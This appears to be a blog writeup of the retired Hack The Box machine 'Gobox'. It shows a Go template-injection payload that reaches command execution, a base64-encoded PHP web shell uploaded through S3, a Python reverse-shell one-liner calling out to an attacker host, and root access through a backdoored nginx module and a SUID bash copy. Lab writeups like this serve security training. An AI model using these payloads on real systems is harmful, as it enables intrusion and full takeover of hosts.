---
layout: default
title : muzec - Gobox Writeup
---

![image](https://user-images.githubusercontent.com/69868171/132503943-1f39df8e-e4e9-4b15-be68-398725fc4db1.png)


### Enumeration/Scanning With Nmap

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/retired/10.10.11.113]
└─$ cat nmap.nmap         
# Nmap 7.91 scan initiated Tue Sep  7 13:14:57 2021 as: nmap -sC -sV -oA nmap 10.10.11.113
Nmap scan report for 10.10.11.113
Host is up (0.78s latency).
Not shown: 994 closed ports
PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open     http       nginx
|_http-title: Hacking eSports | {{.Title}}
8080/tcp open     http       nginx
|_http-title: Hacking eSports | Home page
9000/tcp filtered cslistener
9001/tcp filtered tor-orport
9002/tcp filtered dynamid
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep  7 13:17:49 2021 -- 1 IP address (1 host up) scanned in 171.57 seconds

```

We are having 3 open ports 22,80 and 8080 seems cool the rest is filtered now let go through the port 80 first which is the HTTP.

![image](https://user-images.githubusercontent.com/69868171/132505139-c8f11120-8ab1-42be-8c83-45956aa22bff.png)

A nice homepage i will say lol checking `robots.txt` nothing but seems we have double index page which is `index.html,index.php` .

![image](https://user-images.githubusercontent.com/69868171/132505444-71e48f00-36db-403a-a3b0-3ce2f0fd0d68.png)

Index.html bring out a test page only when the `index.php` bring out the normal homepage i try bursting some directories but got nothing interesting now time to jump to the port 8080.

![image](https://user-images.githubusercontent.com/69868171/132505667-f75596e3-951a-4b2f-956e-7f3be7f78cd5.png)

A Login page is it vulnerable to SQL Injection let give it a try but i spend sometime on the login page and i go nothing but checking the title of the login page i found something strange the title is looking like an SSTI (Server Side Template Injection) payload.

![image](https://user-images.githubusercontent.com/69868171/132506760-b7a3f454-967b-4b02-b89c-99e50037b6c2.png)

So i click on the forgot password page to test the page for SSTI vulnerability but knowing the template engine will help a lot so i try intercepting the request with Burp suite.

![image](https://user-images.githubusercontent.com/69868171/132507449-9a0338c6-af88-4879-9095-1e15e517051d.png)

Nice checking the response and i can see `X-Forwarded-Server: golang` ahhh seems the server is written in Go i Know it running nginx also but the template engine is GO yes it the same now i quickly hit google to find some SSTI payload in GO.

![image](https://user-images.githubusercontent.com/69868171/132507995-ea4c8ee5-df5d-4a7b-a106-3965cf18ec3d.png)

Found some cool website that explain more in exploiting SSTI in Go [SSTI In Go](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html).


![image](https://user-images.githubusercontent.com/69868171/132508589-4ba4b28b-be7d-4680-9b14-647f565f1c2d.png)

Send the request to repeater to try my payload i got `Email Sent To: ssti`  nice a work in progress let dig more.

![image](https://user-images.githubusercontent.com/69868171/132509066-59cc375f-d11e-492a-9cd1-7dbf0b1bde13.png)

Ahhhh cool got some creds to log into the website but nothing interesting it just a source code.

![image](https://user-images.githubusercontent.com/69868171/132509404-915d3c2c-337b-4733-8deb-24e8719bda53.png)

Now trying To get RCE seems the DebugCmd function look interesting.

```
func (u User) DebugCmd (test string) string {
  ipp := strings.Split(test, " ")
  bin := strings.Join(ipp[:1], " ")
  args := strings.Join(ipp[1:], " ")
  if len(args) > 0{
    out, _ := exec.Command(bin, args).CombinedOutput()
    return string(out)
  } else {
    out, _ := exec.Command(bin).CombinedOutput()
    return string(out)
  }
}
```

It isn’t used anywhere else in the page, but it exists.  [Using Functions Inside Go Templates](https://www.calhoun.io/intro-to-templates-p3-functions/) This post talks about how to reference objects (including functions) from the templating engine using a .function_name. Submitting `{{ .DebugCmd "whoami" }}` returns proof of execution.


![image](https://user-images.githubusercontent.com/69868171/132512744-2997add4-3b55-4741-9d75-b6ef965291f1.png)

Boom we have RCE was stuck here for long man i keep trying to get a reverse shell back to my terminal but no luck i try diff reverse shell payloads but got nothing let try checking the hostname.

![image](https://user-images.githubusercontent.com/69868171/132513337-49747eab-fd7f-4a8b-b1e8-792a8bca3ce1.png)

Aws Cool and seems we are in docker env also and the hostname give a clear hint that we are dealing with s3 bucket.

![image](https://user-images.githubusercontent.com/69868171/132517332-7a258be7-147c-469b-a731-f3310fb15580.png)

### AWS Command

```
aws s3 ls  // to see buckets
```

![image](https://user-images.githubusercontent.com/69868171/132520836-c7719da0-9acd-4502-8de7-032e9dbd36ce.png)

```
aws s3 ls s3://website
```

![image](https://user-images.githubusercontent.com/69868171/132521242-432ad01b-5803-42b6-abad-f6d91158bada.png)

Ahhh seems the buckets is on port 80 nice now let try to upload a file on the target.

### UPLOADING A FILE WITH THE RCE AND USING AWS To TRANSFER IT TO PORT 80

```
<?php echo system($_GET["cmd"]); ?>
```

![image](https://user-images.githubusercontent.com/69868171/132523820-a6506c70-7630-4468-8c17-461fcc3626c6.png)

```
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/retired/10.10.11.113]
└─$ cat shell.php | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTsgPz4K
```

![image](https://user-images.githubusercontent.com/69868171/132524964-f700a963-5407-49b8-a147-e609ebcc48da.png)

```
{{ .DebugCmd "echo PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTsgPz4K | base64 -d > /tmp/rev" }}
```

Let confirm if we have our file in the tmp dircetory.

![image](https://user-images.githubusercontent.com/69868171/132525824-afaf56cc-0673-4d59-aaa0-d64f74730902.png)

Ahhh awesome we have it now let copy it to port 80 with aws.


![image](https://user-images.githubusercontent.com/69868171/132526451-295f9ae1-09f9-46a4-94d8-7011a6de49ac.png)


```
aws s3 cp /tmp/rev s3://website/rev.php
```

Now let confirm it on port 80 which is the HTTP.

![image](https://user-images.githubusercontent.com/69868171/132528270-5caf2a42-cd7b-48c5-9461-17b219e6ef27.png)

Boom a webshell now let get a reverse shell back to our terminal.

### SHELL

![image](https://user-images.githubusercontent.com/69868171/132530492-a7f62bb9-e15a-49f2-a029-b4756a6ae1d0.png)

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![image](https://user-images.githubusercontent.com/69868171/132530389-a486ae39-d892-4f76-b729-44980c909566.png)

Now let spawn a TTY shell.

![image](https://user-images.githubusercontent.com/69868171/132531261-9e8097a3-b932-4290-878a-7af64421ccb5.png)


```
python3 -c 'import pty; pty.spawn ("/bin/bash")'
```

Now let get the user.txt in the home directory of the user `ubuntu` .

![image](https://user-images.githubusercontent.com/69868171/132531727-af64a504-6a14-4ee5-bb13-c8147eb1b2d4.png)


### Privilege Escalation

Ahhh the hard the part man i was stuck here for so long all thanks to my buddy `c3p0d4y` for the nudge i love you man so let hit it. The root part is pretty new to me like damn it was fun.

![image](https://user-images.githubusercontent.com/69868171/132534361-79297953-4946-488b-9f31-562990fc1722.png)

Kernal version but nothing thinking it vulnerable to `overlayfs` but it probably patched lol let check the ports that is running locally on the target.

```
www-data@gobox:~/html$ netstat -tulpn
netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:4566            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:9000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:9001            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::9000                 :::*                    LISTEN      -                   
tcp6       0      0 :::9001                 :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
www-data@gobox:~/html$ 
```

We have some pretty strange ports and the hint i got was dig into `/etc/nginx/modules-enabled` thanks again `c3p0d4y`

![image](https://user-images.githubusercontent.com/69868171/132544963-8c179d59-e65b-4118-b8eb-68bfec55eed1.png)


50-backdoor.conf look strange let dig into it.

![image](https://user-images.githubusercontent.com/69868171/132549603-d31a4a2f-d18d-4786-a369-7a239e524f6a.png)

So i decided to know more about the module so it hit google to do some research on it.

![image](https://user-images.githubusercontent.com/69868171/132550249-f991487f-d92f-48ce-8de1-480b756c5f65.png)

The first one look promising let check it out.

```
The NginxExecute module executes the shell command through GET and POST to display the result.

Configuration example：

location ... {
            ......
            command on;
        }

    worker_processes  2;
    events {
        worker_connections  1024;
    }
    http {
        include       mime.types;
        default_type  application/octet-stream;
        sendfile        on;
        keepalive_timeout  65;
        server {
            listen       80;
            server_name  localhost;
            location / {
                root   html;
                index  index.html index.htm;
                command on;
            }
            error_page   500 502 503 504  /50x.html;
            location = /50x.html {
                root   html;
            }
        }
    }

Usage: view-source:http://192.168.18.22/?system.run[command] or curl -g "http://192.168.18.22/?system.run[command]" The command can be any system command. The command you will want to use depends on the permissions that nginx runs with.

view-source:http://192.168.18.22/?system.run[ifconfig]
```

Let locate the module on the target.

![image](https://user-images.githubusercontent.com/69868171/132552309-35170fa8-5e93-4293-97df-b5dc70f25afc.png)

But when i try it i got failed.

![image](https://user-images.githubusercontent.com/69868171/132552580-181164cd-0063-41e1-b394-2acc3725f03c.png)

So i decided to strings the module.

![image](https://user-images.githubusercontent.com/69868171/132552872-75645fc6-2125-4224-b50a-1ce84c1d3b48.png)

```
ippsec.run
```

Now let try it again.

![image](https://user-images.githubusercontent.com/69868171/132553341-59c986f0-9d2b-4c3d-9b13-93731887652d.png)

Boom that is some good sh*t lol now let get the flag.

![image](https://user-images.githubusercontent.com/69868171/132553763-c5e556fa-f60e-4460-a81c-0ec1191922e8.png)


We have the root flag but man that is not fun without a real root shell lol.

![image](https://user-images.githubusercontent.com/69868171/132554979-40745dc4-7bcf-4033-a62a-b05a8151a75e.png)

```
www-data@gobox:/usr/lib/nginx/modules$ curl -g "http://127.0.0.1:8000/?ippsec.run[chmod 777 /tmp/bash]"
<://127.0.0.1:8000/?ippsec.run[chmod 777 /tmp/bash]"
curl: (52) Empty reply from server
www-data@gobox:/usr/lib/nginx/modules$ ls /tmp/bash
ls /tmp/bash
/tmp/bash
www-data@gobox:/usr/lib/nginx/modules$ /tmp/bash -p
/tmp/bash -p
www-data@gobox:/usr/lib/nginx/modules$ ls -la /tmp/bash
ls -la /tmp/bash
-rwxrwxrwx 1 root root 1183448 Sep  8 17:16 /tmp/bash
www-data@gobox:/usr/lib/nginx/modules$ /tmp/bash -p
/tmp/bash -p
www-data@gobox:/usr/lib/nginx/modules$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@gobox:/usr/lib/nginx/modules$  curl 'http://127.0.0.1:8000?ippsec.run[chmod%204777%20%2ftmp%2fbash]'
<.0.1:8000?ippsec.run[chmod%204777%20%2ftmp%2fbash]'
curl: (52) Empty reply from server
www-data@gobox:/usr/lib/nginx/modules$ /tmp/bash -p
/tmp/bash -p
bash-5.0# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
bash-5.0# cd /root
cd /root
bash-5.0# ls
ls
iptables.sh  root.txt  snap
bash-5.0# 
```

With some trial and error i got it and we are done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
